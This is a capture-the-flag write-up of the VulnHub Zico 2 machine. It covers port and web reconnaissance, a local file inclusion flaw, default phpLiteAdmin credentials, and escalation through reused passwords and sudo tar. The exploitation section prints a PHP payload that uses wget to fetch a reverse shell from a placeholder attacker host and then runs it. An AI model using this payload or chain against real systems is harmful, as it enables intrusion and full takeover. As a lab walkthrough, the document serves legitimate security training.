# Zico 2
https://www.vulnhub.com/entry/zico2-1,210/

## Recon

### Nmap Scan
<div>
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Zico's Shop
|_http-server-header: Apache/2.2.22 (Ubuntu)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41708/udp   status
|   100024  1          43168/tcp   status
|   100024  1          44868/udp6  status
|_  100024  1          59995/tcp6  status
43168/tcp open  status  1 (RPC #100024)
</div>

### Web Recon
Port 80 shows a simple home page for a website, looking through the site manually and I was able to find an LFI vulnerability under the /view.php?page= endpoint, with this I was able to read the /etc/passwd file and enumerate users on the machine.

But with only the LFI I could not do nothing too serious, so I decided to fuzz the site with ffuf.

### Fuzzing

js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 1ms]
img                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 0ms]
tools                   [Status: 200, Size: 8355, Words: 3291, Lines: 186, Duration: 0ms]
index                   [Status: 200, Size: 7970, Words: 2382, Lines: 184, Duration: 1ms]
view                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
dbadmin                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]
vendor                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1ms]
package                 [Status: 200, Size: 789, Words: 112, Lines: 30, Duration: 1ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 0ms]

Here the most interesting endpoint was the dbadmin one and when visiting it we are presented with the phpLiteAdmin service. I gained access since the credentials in use where the default ones and I had access to the admin dashboard.

## Exploitation
I was able to get access through the phpLiteAdmin interface since it was vulnerable to a PHP Remote Code Execution vulnerability and I used this to get a reverse shell.
I exploited this by creating a empty database called hack, then I put a single row inside with a default value of:
<?php system("wget <ATTACK_IP>:<ATTACK_PORT>/php-reverse-shell.php 
-O /tmp/reverse-shell.php; php /tmp/reverse-shell.php"); ?>
And now using the LFI I can execute the reverse shell by visiting the directory databases are stored in since we can see on the interface where is stored

### Privilege Escalation
In the machine we can see a user named zico, and in his home directory is a wordpress installation directory, and inside database credentials hardcoded in wp-config.php. When trying to access MySQL we are unsuccessfull but using the same password on the SSH server for the user zico we are successfull.
As the user zico when running sudo -l we get back 2 binaries that can be run as root:
/usr/bin/tar and /usr/sbin/zip, going on GTFObins you can find ways for both of these binaries to be used to escalate privileges, I used the tar one and gained root permissions on the machine
